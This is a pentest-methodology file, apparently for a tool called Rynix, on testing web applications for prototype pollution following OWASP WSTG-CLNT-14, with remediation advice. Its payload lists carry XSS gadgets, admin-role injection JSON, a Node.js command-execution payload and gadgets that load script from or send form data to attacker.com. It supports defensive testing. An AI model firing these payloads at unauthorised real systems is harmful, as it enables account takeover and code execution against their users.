---
id: WSTG-CLNT-14
title: Testing for Client-side Prototype Pollution
category: Client-Side
severity_range: Low-High
owasp_ref: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/14-Testing_for_Client-side_Prototype_Pollution
---

# WSTG-CLNT-14: Testing for Client-side Prototype Pollution

## Summary

Prototype pollution is a JavaScript vulnerability where an attacker modifies `Object.prototype` (or other built-in prototypes) by injecting properties via URL parameters, JSON input, or object merge operations. Since all JavaScript objects inherit from `Object.prototype`, adding a property to it makes that property available on every object in the application. This can lead to XSS (if polluted properties are used in DOM sinks), logic bypass, privilege escalation, or denial of service.

## Test Objectives

- Identify prototype pollution vectors (URL parameters, JSON parsing, merge functions)
- Test if `Object.prototype` can be polluted via user input
- Determine if polluted properties reach security-sensitive sinks (DOM XSS, logic checks)
- Assess the impact of successful prototype pollution

## Prerequisites

- Target application uses JavaScript with object manipulation
- Docker pentest container capturing traffic
- JavaScript source code accessible for analysis

## Test Steps

### Step 1: Identify Potential Pollution Vectors

**CLI Actions:**
Use `curl` to fetch JavaScript files and search for vulnerable patterns:

```
GET /static/js/app.js HTTP/1.1
Host: target.com
```

Search for patterns that may allow prototype pollution:
```javascript
// Vulnerable merge/extend functions
Object.assign({}, userInput)
$.extend(true, {}, userInput)   // jQuery deep extend
_.merge({}, userInput)          // Lodash merge
_.defaultsDeep({}, userInput)   // Lodash defaultsDeep

// Vulnerable property assignment
obj[key] = value  // where key is user-controlled
obj[a][b] = value // where a and b are user-controlled

// URL parameter parsing
new URLSearchParams(location.search)
// Custom URL parsers that build nested objects
```

### Step 2: Test URL Parameter-Based Pollution

**CLI Actions:**
Use `curl` to test prototype pollution via URL parameters:

```
GET /page?__proto__[polluted]=true HTTP/1.1
Host: target.com
```

```
GET /page?__proto__.polluted=true HTTP/1.1
Host: target.com
```

```
GET /page?constructor[prototype][polluted]=true HTTP/1.1
Host: target.com
```

Use `curl --data-urlencode` to encode payloads:
```
GET /page?__proto__%5Bpolluted%5D=true HTTP/1.1
Host: target.com
```

After the page loads, the `polluted` property would be available on all objects if the pollution succeeds.

### Step 3: Test JSON-Based Pollution

**CLI Actions:**
Use `curl` to submit JSON with prototype pollution payloads:

```
POST /api/settings HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer <token>

{"__proto__": {"isAdmin": true}}
```

```
POST /api/data HTTP/1.1
Host: target.com
Content-Type: application/json

{"constructor": {"prototype": {"isAdmin": true}}}
```

```
PUT /api/profile HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer <token>

{"name": "test", "__proto__": {"role": "admin", "verified": true}}
```

### Step 4: Test for XSS via Prototype Pollution Gadgets

**CLI Actions:**
Use `curl` to test common gadgets that convert prototype pollution to XSS:

**jQuery html gadget:**
```
GET /page?__proto__[innerHTML]=<img/src/onerror=alert('XSS')> HTTP/1.1
Host: target.com
```

**Event handler gadgets:**
```
GET /page?__proto__[onclick]=alert('XSS') HTTP/1.1
Host: target.com
```

**src/href gadgets:**
```
GET /page?__proto__[src]=data:text/javascript,alert('XSS') HTTP/1.1
Host: target.com
```

```
GET /page?__proto__[href]=javascript:alert('XSS') HTTP/1.1
Host: target.com
```

**Script creation gadgets:**
```
GET /page?__proto__[srcdoc]=<script>alert('XSS')</script> HTTP/1.1
Host: target.com
```

### Step 5: Test Library-Specific Gadgets

**CLI Actions:**
Use `curl` to fetch JavaScript and identify which libraries are used:

```
GET /static/js/vendor.js HTTP/1.1
Host: target.com
```

Test library-specific gadgets:

**Lodash (_.merge, _.defaultsDeep):**
```
POST /api/data HTTP/1.1
Host: target.com
Content-Type: application/json

{"__proto__": {"sourceURL": "\\u000aalert('XSS')//"}}
```

**jQuery ($.extend with deep=true):**
```
GET /page?__proto__[div][0]=1&__proto__[div][1]=<img/src/onerror=alert('XSS')> HTTP/1.1
Host: target.com
```

### Step 6: Test Server-Side Prototype Pollution

**CLI Actions:**
Use `curl` to test if server-side JavaScript (Node.js) is vulnerable:

```
POST /api/config HTTP/1.1
Host: target.com
Content-Type: application/json

{"__proto__": {"admin": true, "status": 200}}
```

```
POST /api/user HTTP/1.1
Host: target.com
Content-Type: application/json

{"__proto__": {"shell": "/bin/bash", "NODE_OPTIONS": "--require=/proc/self/environ"}}
```

Server-side prototype pollution can lead to RCE in Node.js applications.

Use `rynix_plugin_run('template-scan')` to check for prototype pollution findings.

## Payloads

### URL Parameter Pollution Vectors
```
?__proto__[polluted]=true
?__proto__.polluted=true
?constructor[prototype][polluted]=true
?constructor.prototype.polluted=true
?__proto__[toString]=polluted
?__proto__[valueOf]=polluted
```

### JSON Pollution Vectors
```json
{"__proto__": {"polluted": true}}
{"constructor": {"prototype": {"polluted": true}}}
{"__proto__": {"isAdmin": true, "role": "admin"}}
```

### XSS Gadget Payloads
```
# Generic gadgets
?__proto__[innerHTML]=<img/src/onerror=alert(1)>
?__proto__[outerHTML]=<img/src/onerror=alert(1)>
?__proto__[srcdoc]=<script>alert(1)</script>

# jQuery gadgets
?__proto__[src][]=data:,alert(1)//
?__proto__[data-]=<img/src/onerror=alert(1)>

# Event handler gadgets
?__proto__[onclick]=alert(1)
?__proto__[onload]=alert(1)
?__proto__[onerror]=alert(1)

# URL/source gadgets
?__proto__[href]=javascript:alert(1)
?__proto__[src]=//attacker.com/xss.js
?__proto__[action]=//attacker.com/capture

# Lodash gadgets
?__proto__[sourceURL]=\u000aalert(1)//
```

### Server-Side Pollution Payloads (Node.js)
```json
{"__proto__": {"admin": true}}
{"__proto__": {"outputFunctionName": "_tmp1;global.process.mainModule.require('child_process').exec('id');var __tmp2"}}
{"__proto__": {"allowDots": true, "status": 510}}
```

### Detection Payloads
```
# Simple detection - check if property exists on empty object
?__proto__[testPollution]=PollutionDetected

# After loading page, in browser console:
# {}.testPollution === "PollutionDetected" -> Polluted!
```

## Detection Criteria

A finding should be logged when:
- `Object.prototype` can be modified via URL parameters or JSON input
- Prototype pollution leads to XSS through DOM gadgets
- Prototype pollution modifies application logic (isAdmin, role, permissions)
- Vulnerable merge/extend functions process user-controlled input
- Server-side prototype pollution modifies Node.js behavior
- Application uses known-vulnerable versions of libraries with prototype pollution issues

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| Prototype pollution leads to XSS via DOM gadgets | High |
| Server-side prototype pollution enables RCE in Node.js | High (Critical) |
| Prototype pollution modifies authentication/authorization logic | High |
| Prototype pollution confirmed but no exploitable gadget found | Medium |
| Vulnerable merge function exists but input is partially sanitized | Low |
| Known-vulnerable library version but pollution vector not confirmed | Low |
| Libraries use Object.create(null) or freeze prototypes | Not a finding |

## Remediation

- Use `Object.create(null)` for dictionary objects that parse user input
- Freeze prototypes: `Object.freeze(Object.prototype)`
- Sanitize input: filter out `__proto__`, `constructor`, and `prototype` keys from user input
- Update vulnerable libraries (Lodash, jQuery) to patched versions
- Use `Map` instead of plain objects for user-controlled key-value data
- Validate JSON input schema before processing
- Use `Object.hasOwnProperty()` checks before accessing properties
- Implement allowlists for accepted property names in merge operations
- For Node.js: use `--disable-proto=throw` flag (Node 12+)
- Use static analysis tools to detect prototype pollution sinks

## References

- [OWASP Testing Guide - Client-side Prototype Pollution](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/14-Testing_for_Client-side_Prototype_Pollution)
- [CWE-1321: Improperly Controlled Modification of Object Prototype Attributes](https://cwe.mitre.org/data/definitions/1321.html)
- [technique - Prototype Pollution](https://owasp.org/web-security/prototype-pollution)

## Rynix workflow

1. `scope_check` and `register_scope` for the target host.
2. `get_wstg_test` for this test ID — read objectives.
3. Execute probes via `http_probe` / `compare_role_response` / `run_idor_matrix`.
4. `track_wstg_test` with status and evidence path.
5. `record_finding` only when verified with probe evidence.

## Evidence requirements

- Request/response snippet or `compare_role_response` diff.
- Session ID on all tool calls.
- No unverified claims in `export_report`.
## ASVS mapping

- V3 Session Management — client-side token storage.
- V5 Validation — DOM sinks and postMessage origins.

## CWE references

- CWE-79: XSS
- CWE-1021: Improper Restriction of Rendered UI Layers

## Rynix tooling

- Primary tools: ``list_frontend_routes``, ``http_probe``, ``rynix_plugin_run` (browser-debug)`

## Test focus

- Map client routes; verify server enforces auth regardless of UI guards.

## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

